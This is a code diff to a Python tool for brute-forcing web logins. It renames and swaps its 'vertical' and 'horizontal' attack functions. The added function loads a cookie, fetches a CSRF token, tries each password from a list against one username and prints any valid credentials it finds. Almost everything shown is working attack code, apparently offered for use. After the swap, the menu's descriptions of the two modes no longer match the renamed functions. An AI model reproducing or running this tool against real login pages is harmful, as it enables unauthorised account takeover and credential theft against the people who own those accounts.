@@ -77,8 +77,34 @@ def attempt_login(session, username, password, csrf_token):
 GREEN = "\033[32m"
 RESET = "\033[0m"  # Reset to default color
 
-def vertical_brute_force():
-    """Perform vertical brute-force attack."""
+
+def vertical_brute_force(single_username):
+    """Perform vertical brute-force attack for a single user."""
+    with requests.Session() as session:
+        # Load cookie into the session
+        session.cookies.update(load_cookie())
+
+        csrf_token = fetch_csrf_token(session)
+        if csrf_token is None:
+            print("Failed to fetch CSRF token. Aborting.")
+            return
+
+        for password in passwords:
+            success, response = attempt_login(session, single_username, password, csrf_token)
+
+            if success:
+                print(f"{GREEN}[SUCCESS]{RESET} Username: {single_username}, Password: {password}")
+                return  # Exit after a successful login
+            elif "Invalid credentials" in response.text:
+                print(f"[FAIL] Password: {password}")
+            else:
+                print(f"[ERROR] Unexpected response for Password: {password}")
+
+            time.sleep(1)  # Sleep to prevent overwhelming the server
+
+
+def horizontal_brute_force():
+    """Perform horizontal brute-force attack."""
     with requests.Session() as session:
         # Load cookie into the session
         session.cookies.update(load_cookie())
@@ -111,31 +137,6 @@ def vertical_brute_force():
 
             print(f"Finished trying passwords for Username: {username}")
 
-
-
-def horizontal_brute_force(single_username):
-    """Perform horizontal brute-force attack for a single user."""
-    with requests.Session() as session:
-        # Load cookie into the session
-        session.cookies.update(load_cookie())
-
-        csrf_token = fetch_csrf_token(session)
-        if csrf_token is None:
-            print("Failed to fetch CSRF token. Aborting.")
-            return
-
-        for password in passwords:
-            success, response = attempt_login(session, single_username, password, csrf_token)
-
-            if success:
-                print(f"{GREEN}[SUCCESS]{RESET} Username: {single_username}, Password: {password}")
-                return  # Exit after a successful login
-            elif "Invalid credentials" in response.text:
-                print(f"[FAIL] Password: {password}")
-            else:
-                print(f"[ERROR] Unexpected response for Password: {password}")
-
-            time.sleep(1)  # Sleep to prevent overwhelming the server
 
 # Choose the attack type
 print("Select attack type: \n1. Vertical (multiple users, single password list)\n2. Horizontal (single user, multiple passwords)")
